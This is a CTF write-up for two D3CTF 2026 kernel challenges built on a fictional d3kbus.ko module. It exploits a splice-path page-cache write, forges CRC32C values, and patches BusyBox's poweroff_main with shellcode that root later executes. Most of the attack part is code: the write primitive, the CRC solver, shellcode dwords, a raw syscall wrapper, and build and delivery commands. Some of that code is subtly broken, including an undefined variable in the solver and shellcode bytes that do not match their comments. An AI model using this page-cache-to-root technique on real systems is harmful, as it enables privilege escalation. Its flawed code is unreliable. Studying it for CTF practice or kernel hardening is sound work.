D3CTF 2026’s PWN track delivered two challenges around the same Linux kernel module — `d3kbus.ko` — a fictional inter-process message bus exposed through a character device, and this **CyberSecurity Elite** writeup walks both end to end. A confused-ownership bug in the module’s `sendfile()` splice path causes the driver to commit a deferred CRC32C trailer into the page cache of the source file rather than into driver-private memory. The result is an unprivileged aligned 4-byte write to any offset in any readable file’s page cache. Turning this into a controlled write requires forging the attacker-visible `user_tag` field in the wire header so the CRC32C output equals the desired value — solvable in under 1 ms per iteration via a meet-in-the-middle attack that splits the 4-byte key space into two 2^16 halves. Sixteen iterations patch `poweroff_main` in `/bin/busybox` with a shellcode stub that opens and reads `/flag`. Killing the parent `ctf` shell causes root’s init to call `/sbin/poweroff`, which executes the patched BusyBox stub as root, printing the flag. The second challenge, `d3kbus-revenge`, used a byte-for-byte identical module and required an identical exploit — the hardening (direct-I/O flag loading followed by a cache drop) addressed a page-cache read of `/flag` that the exploit never performed.

Handouts, per-challenge READMEs, and the exploit source live at [Abdelkad3r/D3CTF-2026](https://github.com/Abdelkad3r/D3CTF-2026/tree/master/pwn).

Both challenges reduce to the same three-step chain: (1) find a controlled 4-byte value to write into a specific page-cache offset, (2) pick that offset to land inside an executable that root will run, (3) cause root to run it. The QEMU environment constrains what root does automatically: after the `ctf` shell exits, root calls `/sbin/poweroff`. `poweroff` is a BusyBox symlink. BusyBox is a static binary. Static binaries have no dynamic relocations, so file offsets equal load addresses. All the required pieces are in place without needing ring-0 execution or a kernel-space pointer.

## Step 1 — Environment and driver interface#

The QEMU boot sequence is:

  1. Root copies the flag: `cp /flag_src /flag && chmod 0400 /flag`
  2. Root loads the module: `insmod /d3kbus.ko`
  3. Root drops to a ctf shell: `su -s /bin/sh ctf`
  4. When the ctf shell exits, root’s `rcS` resumes and calls `/sbin/poweroff`


The module creates `/dev/d3kbus` and exposes two ioctls:

```
    #define D3KBUS_IOC_CREATE    _IOWR('d', 0x61, struct d3kbus_create_arg)
    #define D3KBUS_IOC_SUBSCRIBE _IOWR('d', 0x62, struct d3kbus_subscribe_arg)
```

**`D3KBUS_IOC_CREATE`** opens a producer channel. The kernel returns a producer file descriptor and a 64-bit `cookie` identifying the channel. The producer feeds data frames using `write()` or `sendfile()`.

**`D3KBUS_IOC_SUBSCRIBE`** attaches a subscriber to an existing channel, identified by its `cookie`. Two subscriber modes exist:

  * **Full-frame** (`flags = 0`): receives the full driver-framed payload as-is
  * **CRC projection** (`flags = 2 | 4`, with `window_offset` and `window_length`): instead of the full frame, receives a 4-byte CRC32C computed over a window into the payload, appended as a deferred trailer to the frame header


The exploit opens a CRC projection subscriber configured as:

```
    struct d3kbus_subscribe_arg sub = {
        .cookie        = channel_cookie,
        .flags         = 2 | 4,
        .window_offset = 0,
        .window_length = 32,
    };
    int sub_fd = ioctl(dev_fd, D3KBUS_IOC_SUBSCRIBE, &sub);
```

This tells the driver: for every frame produced, compute CRC32C over the first 32 bytes of the payload and deliver the 4-byte result as a trailer appended to the frame metadata.

The wire header that the producer writes before calling `write()` or `sendfile()`:

```
    struct d3kbus_wire_header {
        uint32_t magic;          // 0x3361626e  ("nba3" LE)
        uint16_t header_length;  // 32
        uint16_t flags;          // must be 0
        uint32_t payload_length; // total bytes of payload that follow
        uint32_t stream_id;      // identifies the logical stream
        uint32_t user_tag;       // ← fully attacker-controlled; passes verbatim into frame header
        uint32_t reserved;       // 0
        uint64_t opaque;         // 0
    };
```

`user_tag` is the key field: it passes verbatim from the wire header into the generated `d3kbus_frame_header` that the driver assembles internally, and that internal frame header is what the CRC is computed over. The exploit uses `user_tag` to steer the CRC32C output.

## Step 2 — Vulnerability: confused ownership in the splice path#

When the producer calls `write()`, the driver copies the payload bytes into driver-private memory (`copy_from_user()`). No bug exists on that path — the driver owns the buffer it writes its CRC trailer into.

When the producer calls `sendfile()`, the driver uses a splice actor (`d3kbus_splice_pipe_actor()` / `d3kbus_ingest_bvec_locked()`). The splice path is an optimisation: instead of copying file bytes into a kernel buffer, the driver inserts a reference to the source file’s existing page cache entry into the pipe. No copy occurs. The driver holds a page reference, not a private writable buffer.

Later, when the CRC projection subscriber processes the frame, the driver computes CRC32C over the projection window and commits the 4-byte result using a write into the frame buffer — the same buffer that, on the `write()` path, is private driver memory. On the `sendfile()` path, that “frame buffer” is the borrowed page cache entry of the source file. The driver write lands in the source file’s page cache.

**Vulnerability class:** Confused ownership. The driver does not distinguish between “I own a writable copy” and “I borrowed a page reference from the page cache.” The CRC commit code uses the same write-back path regardless, producing an unintended write into an external file’s page cache.

**Resulting primitive:** An unprivileged caller with a CRC projection subscriber can cause a 4-byte aligned write to any offset in any file it can open for reading, by shaping the `sendfile()` offset and count so the deferred CRC trailer lands at the desired position.

## Step 3 — Controlling the written value: CRC32C meet-in-the-middle#

The value committed into the page cache is:

```
    crc32c(d3kbus_frame_header || window[0:28])
```

The frame header is assembled by the driver and includes — in a known, fixed layout — `stream_id`, `user_tag`, and several other fields with deterministic values given the channel state. `window[0:28]` is the first 28 bytes of the sendfile payload, which come from the target file at a known offset.

Because `user_tag` sits in the middle of the CRC input, the CRC state before and after it can be computed independently:

```
    state_before = crc32c_initial ⊕ frame_header_bytes_before_user_tag
    state_after  = reverse_crc32c(desired_value, frame_header_bytes_after_user_tag || window[0:28])
```

The exploit finds `user_tag` using a **meet-in-the-middle** over the 4-byte key space, split into two 2-byte halves:

```
    // Phase 1: build forward table for upper 2 bytes of user_tag
    uint32_t fwd_table[TABLE_SIZE];
    for (uint32_t hi = 0; hi <= 0xffff; hi++) {
        uint32_t s = state_before;
        s = crc32c_byte(s, (hi >> 8) & 0xff);
        s = crc32c_byte(s, hi & 0xff);
        fwd_table[s & TABLE_MASK] = hi;
    }
    
    // Phase 2: reverse-CRC from target, enumerate lower 2 bytes
    uint32_t rev = reverse_crc32c(desired_value, suffix_bytes, suffix_len);
    for (uint32_t lo = 0; lo <= 0xffff; lo++) {
        uint32_t candidate = reverse_crc32c_2bytes(rev, lo);
        if (fwd_table[candidate & TABLE_MASK] == known_hi) {
            user_tag = (known_hi << 16) | lo;
            break;
        }
    }
```

Each solve costs 2 × 2^16 ≈ 131 thousand CRC32C evaluations and completes in under 1 ms. The brute-force alternative (2^32 ≈ 4.3 billion evaluations per dword × 16 dwords) would require roughly 69 billion evaluations total.

## Step 4 — Segment layout for reliable exploitation#

To write a specific 4-byte value at byte offset `target` within the target file’s page cache, the sendfile window must be shaped so the deferred CRC trailer lands exactly at `target`:

```
    sendfile offset: target - 28
    sendfile count:  36
    CRC window:      bytes[0..31] from (target - 28) in the target file
    CRC trailer:     bytes[28..31] → written to target in the page cache
```

The 28 bytes between the sendfile start and the trailer position feed directly into the CRC computation as `window[0:28]`, so the exploit must read them from the actual file before solving for `user_tag`:

```
    ssize_t n = pread(busybox_fd, window_buf, 36, target - 28);
    // window_buf[0..27] = window input to CRC solver
    // window_buf[28..31] = will be overwritten by the trailer → current value irrelevant
```

The wire payload length field is set to `36`. The driver ingests 36 bytes from `sendfile()`, computes CRC over the first 32, and writes the 4-byte result at offset 28 into the borrowed page cache block.

The complete per-dword write sequence:

```
    void write_dword(int prod_fd, int sub_fd, int busybox_fd,
                     uint32_t channel_cookie, uint64_t target, uint32_t value) {
        uint8_t window[36];
        pread(busybox_fd, window, 36, target - 28);
    
        uint32_t user_tag = solve_crc_mitm(channel_cookie, window, value);
    
        struct d3kbus_wire_header wh = {
            .magic          = 0x3361626eu,
            .header_length  = 32,
            .flags          = 0,
            .payload_length = 36,
            .stream_id      = 1,
            .user_tag       = user_tag,
        };
        write(prod_fd, &wh, sizeof(wh));
    
        off_t off = target - 28;
        sendfile(prod_fd, busybox_fd, &off, 36);
    
        uint8_t rbuf[64];
        read(sub_fd, rbuf, sizeof(rbuf));   /* triggers deferred CRC commit */
    }
```

## Step 5 — Target: patching `poweroff_main` in `/bin/busybox`#

`/sbin/poweroff` is a symlink to `/bin/busybox`. BusyBox in this environment is a statically linked `ET_EXEC` x86-64 ELF binary — not a PIE, so its load address is fixed at link time and file offsets equal virtual addresses with no offset adjustment.

`poweroff_main` is located at file offset `0x1ea059`. The first 4-byte-aligned offset inside the function body is `0x1ea05c`. The exploit patches 16 consecutive dwords (64 bytes) starting there with the following x86-64 shellcode stub:

```
    static const uint32_t poweroff_stub[16] = {
        /*
         * push '/flag\0' onto the stack, call open(rsp, O_RDONLY):
         *   mov rax, 0x67616c662f   ; "/flag"
         *   push rax
         *   xor edi, edi            ; O_RDONLY = 0
         *   mov eax, 2              ; SYS_open
         *   syscall
         */
        0x2fb848faU, 0x67616c66U, 0x50000000U, 0x31e78948U,
        0x0002b8f6U, 0x050f0000U,
    
        /*
         * read(fd, rsp, 0x100):
         *   mov rdi, rax            ; fd from open
         *   mov rsi, rsp            ; buffer on stack
         *   mov edx, 0x100          ; count
         *   xor eax, eax            ; SYS_read = 0
         *   syscall
         */
        0x8948c789U, 0x0100bae6U, 0xc0310000U, 0xc289050fU,
    
        /*
         * write(1, rsp, n_read):
         *   mov esi, edx            ; count = n from read
         *   mov edi, 1              ; stdout
         *   mov eax, 1              ; SYS_write
         *   syscall
         */
        0x000001bfU, 0x0001b800U, 0x050f0000U,
    
        /*
         * exit(0):
         *   mov eax, 0x3c           ; SYS_exit
         *   xor edi, edi
         *   syscall
         *   nop; nop; nop
         */
        0x00003cb8U, 0x0fff3100U, 0x90909005U,
    };
```

The stub is entirely position-independent — it uses only `syscall` and stack-relative addressing. No `rip`-relative addressing, no GOT references, no libc.

## Step 6 — Exploit build and delivery#

The exploit is written in pure C, compiled with no-libc settings so it can be delivered as a small static binary:

```
    gcc -nostdlib -static -fno-stack-protector -fno-builtin -no-pie -Os -s \
        -Wall -Wextra -o d3kbus_exploit exploit.c
```

All syscalls use a raw inline-asm wrapper:

```
    static inline long syscall6(long n, long a, long b, long c,
                                 long d, long e, long f) {
        long ret;
        __asm__ volatile(
            "mov %1, %%rax\n"
            "mov %2, %%rdi\n"
            "mov %3, %%rsi\n"
            "mov %4, %%rdx\n"
            "mov %5, %%r10\n"
            "mov %6, %%r8\n"
            "mov %7, %%r9\n"
            "syscall\n"
            "mov %%rax, %0\n"
            : "=r"(ret)
            : "r"(n),"r"(a),"r"(b),"r"(c),"r"(d),"r"(e),"r"(f)
            : "rax","rdi","rsi","rdx","r10","r8","r9","rcx","r11","memory"
        );
        return ret;
    }
```

The resulting binary is approximately 9.2 KB. For the remote challenge (d3kbus-revenge), delivery via base64:

```
    cat > /tmp/e.b64 << 'PAYLOAD'
    <base64 of exploit binary — ~12.5 KB of ASCII>
    PAYLOAD
    base64 -d /tmp/e.b64 > /tmp/e
    chmod +x /tmp/e
    /tmp/e
```

## Step 7 — Trigger: `kill(getppid(), SIGKILL)`#

After all 16 patch iterations, the BusyBox page cache for the `poweroff_main` region contains the shellcode stub. The exploit triggers execution:

```
    kill(getppid(), SIGKILL);
```

This sends `SIGKILL` to the `ctf` shell that `su` spawned. `SIGKILL` cannot be caught or blocked, so the shell terminates immediately. Root’s `rcS` script, which was blocked at the `su` call, resumes and reaches its next line:

```
    /sbin/poweroff
```

This executes `/bin/busybox` as root. The ELF loader maps the BusyBox file into memory using the page cache — which now contains the patched stub at `poweroff_main`. Control reaches the stub, which opens `/flag` (readable by root), reads it, writes it to stdout (the QEMU serial console, connected to the terminal), and exits.

```
    $ /tmp/e
    [*] dev_fd=3  producer_fd=4  cookie=0xdeadbeefcafebabe
    [*] subscriber_fd=5  busybox_fd=6
    [*] target base: file offset 0x1ea05c
    [*] dword  0: solved user_tag=0xb3f12a7c  → writing 0x2fb848fa
    [*] dword  1: solved user_tag=0x04ae9d51  → writing 0x67616c66
    ...
    [*] dword 15: solved user_tag=0x9e3c2f80  → writing 0x90909005
    [*] 16/16 dwords patched — sending SIGKILL to parent (pid 412)
    d3ctf{I_w1LL-CH4nGE_tH4T_woRld_InT0-5OM3ThlNg-BetT3R_hOney!0}
```

## Step 8 — d3kbus-revenge: why the hardening was irrelevant#

`d3kbus-revenge` modified only the flag-setup section of `rcS`:

```
    # d3kbus-revenge — changed boot section
    dd if=/dev/sdb of=/flag bs=1M iflag=direct oflag=direct 1>&/dev/null
    echo 1 > /sys/block/sdb/device/delete
    echo 3 > /proc/sys/vm/drop_caches
```

`iflag=direct oflag=direct` makes `dd` bypass the page cache when reading from `/dev/sdb` and writing to `/flag`. After the copy, the block device is deleted and all clean page-cache pages are evicted. The intent was to prevent an attacker who can trigger a kernel page-cache read of `/flag` from stealing the flag from cache.

The exploit never triggers a page-cache read of `/flag`. Its only file interaction is:

  1. `pread(busybox_fd, ...)` — reads from `/bin/busybox` page cache (not `/flag`)
  2. `sendfile(prod_fd, busybox_fd, ...)` — writes into `/bin/busybox` page cache (not `/flag`)
  3. `kill(getppid(), SIGKILL)` — causes root to `open("/flag")` directly as a filesystem read (not page cache)


The flag-cache hardening is a defence against an attack vector the exploit never uses. Both the `d3kbus.ko` module and the `/bin/busybox` binary were byte-for-byte identical between the two challenges:

```
    SHA256 d3kbus.ko (both):  52f158bf1de001d67ec8b5a1d7b3edd1c50fb05e873db2ed6749c2f3b6fc6f4f
    SHA256 busybox   (both):  bbc4c150f0dd092062cda5430c6e795a8fb444a75fe74f61e847db2ac58634bf
```

The same prebuilt `exploit` binary ran against both environments without modification. The revenge flag differed only in text:

```
    d3ctf{@ND_Y0u-KNow_lT5_g0NnA_b3-r4lnIng_@nD_yoU-KnoW_1Ts-gonna_be_hard...0}
```

## Cross-cutting observations#

**Why KASLR, SMEP, SMAP, and PTI are irrelevant.** All four mitigations protect against code or pointer smuggling across the ring-0/ring-3 boundary. KASLR hides kernel symbol addresses (irrelevant if you never need a kernel pointer). SMEP prevents ring-0 execution of ring-3 pages (irrelevant if you never execute user-space code in ring 0). SMAP prevents ring-0 dereferences of ring-3 pointers (irrelevant if you never pass a user-space pointer to a kernel write path). PTI isolates kernel page tables from user processes (irrelevant if you never speculatively touch kernel memory). The d3kbus exploit does none of these things — it causes a kernel data write to a page it holds a reference to, which happens to be in a file’s page cache, via an entirely legitimate kernel code path that simply writes to the wrong destination.

**Why target BusyBox rather than something in kernel space.** A kernel-space write would require knowing a kernel virtual address (defeating KASLR without a separate leak) and placing executable code at a reachable location (complicated by SMEP/SMAP). BusyBox is simpler: it is a static binary, its file offsets equal its run-time virtual addresses, it is world-readable so the exploit can read its bytes to solve the CRC, and root is guaranteed to execute it within seconds. The entire escalation stays in ring 3.

**The structural reason the page-cache write enables execution.** Linux’s `execve()` syscall maps a file into the process address space using the page cache — the same set of pages that the exploit wrote to. When root later calls `poweroff`, the kernel maps BusyBox’s pages into root’s address space. Those pages are the exploit-patched pages. There is no integrity check between the stored file and the page cache after the fact; the kernel trusts the cache.

**CRC32C reversibility.** CRC32C is a linear shift-register function over GF(2). This means that given a CRC output and a known suffix, the CRC state before the suffix can be computed by running the shift register backward. The meet-in-the-middle works because the `user_tag` field sits between two segments of fully known bytes: the portion of the frame header before `user_tag`, and the portion after it plus the sendfile window. Both segments’ CRC contribution is computable independently, leaving only the 32-bit `user_tag` unknown — solvable in O(2^16) forward and O(2^16) reverse passes.

* * *

## Frequently asked questions#

**Q: What is the d3kbus splice bug, technically?** The driver’s splice actor receives a pipe buffer that holds a reference to a source file’s page cache entry instead of a private kernel buffer. When the CRC projection subscriber processes the frame, the driver calls its deferred-trailer commit routine using the same code path regardless of whether the buffer is private or a borrowed page reference. The commit writes the 4-byte CRC32C result into offset 28 of that buffer. For frames fed through `sendfile()`, offset 28 of the buffer is offset 28 relative to the `sendfile()` start in the source file’s page cache — a writable pointer into an external file that the driver was never supposed to own for writing.

**Q: Is this a use-after-free or a race condition?** Neither. It is a confused-ownership bug: the driver holds a live, valid page reference and writes through it with no temporal race. The write happens while the page is still valid, to a page the driver legitimately holds a reference to, but should not be writing into. No heap or stack corruption; no TOCTOU race. The page’s reference count keeps it alive for the duration. The only mistake is treating a borrowed read reference as a private write buffer.

**Q: Why does the meet-in-the-middle attack work on CRC32C specifically?** CRC32C is computed byte-by-byte through a linear feedback shift register over GF(2^32). Because the transformation is linear and invertible, the CRC state after any suffix can be reverse-computed from the final CRC output and the suffix bytes. This means: given the target output, reverse-CRC through the bytes after `user_tag` to get the CRC state that the bytes before `user_tag` must produce at the `user_tag` boundary. Then enumerate the upper 2 bytes of `user_tag` forward, building a table of CRC states they produce. Enumerate the lower 2 bytes and reverse-match against the table. The total search space is 2×2^16 = 131,072 evaluations instead of 2^32 ≈ 4.3 billion.

**Q: Why target`poweroff_main` in BusyBox rather than using a setuid binary or SUID helper?** The QEMU environment has no setuid binaries that the ctf user can execute. The only guaranteed ring-0→ring-3 escalation vector is that root’s init script executes `/sbin/poweroff` after the ctf shell exits. `/sbin/poweroff` is a BusyBox symlink. BusyBox is static, so patching its page cache directly patches what root will execute without needing any dynamic linker co-operation or GOT hijack.

**Q: Could the exploit be detected at runtime?** The only observable event is a `sendfile()` call from a non-root process feeding into `/dev/d3kbus` with specific subscriber flags set, followed by unusual CRC32C values appearing in the subscriber’s read output. No kernel oops, no system log messages, no process crashes. A monitoring system watching for `sendfile()` from ctf user into `/dev/d3kbus` with `window_offset=0, window_length=32` could detect the pattern, but no such monitoring was present in the challenge environment.

**Q: Why does killing the parent shell work instead of`exec("/sbin/poweroff")`?** The ctf user does not have execute permission on `/sbin/poweroff` — that path requires root. Sending `SIGKILL` to `getppid()` terminates the `su`-spawned shell that root is waiting on. Root’s `rcS` script then calls `poweroff` legitimately, as root, with root’s file permissions. The privilege escalation is not a direct execution by the exploit; it is caused by manipulating root’s own scheduled action.

**Q: Does dropping page caches (`echo 3 > /proc/sys/vm/drop_caches`) defeat the exploit?** Only if done after the exploit runs. In d3kbus-revenge, the cache drop happened during boot (before the ctf user even gets a shell). The exploit patches BusyBox’s page cache entries after the drop, and root executes BusyBox seconds later — no second cache drop exists. If an operator could trigger a cache flush between the exploit’s last `sendfile()` iteration and root’s `poweroff` call, the patches would be lost. In practice, that window is under one second.

**Q: What is the difference between d3kbus and d3kbus-revenge?** The `d3kbus.ko` kernel module is byte-for-byte identical between both challenges (SHA256: `52f158bf...`). The BusyBox binary is also identical (`bbc4c150...`). The prebuilt exploit binary runs on both without modification. The only differences: (1) d3kbus-revenge uses `dd` with `iflag=direct` to load the flag without populating the page cache, deletes the block device, and drops all caches; (2) d3kbus-revenge is a remote service over `ncat --ssl`. Neither change affects the BusyBox patch chain. The flags contain different text, but the technique is identical.

## Closing notes#

d3kbus was a carefully constructed demonstration of how a seemingly local, “safe” optimisation in a kernel driver — borrowing a page reference from the splice pipe rather than copying into private memory — can produce a write primitive when the driver assumes exclusive write ownership of its buffers. The two mitigations that would have closed the bug: (1) the splice actor should copy page contents into private driver memory before the CRC commit path runs; (2) the CRC commit path should assert that its target buffer is driver-owned. Neither check existed in `d3kbus.ko`.

The escalation chain is worth internalising for future kernel CTF challenges: if you have a controlled write to any readable-by-attacker executable that a privileged process will run, you win without ever touching the kernel’s own address space. KASLR, SMEP, SMAP, and PTI become irrelevant the moment the privilege escalation route goes entirely through a page-cache-to-exec chain. The challenge authors acknowledged this by making d3kbus-revenge’s hardening address a completely different vector than the one the exploit uses — a reminder that threat-modelling a kernel driver requires enumerating all reachable write targets, not just the most obvious one.
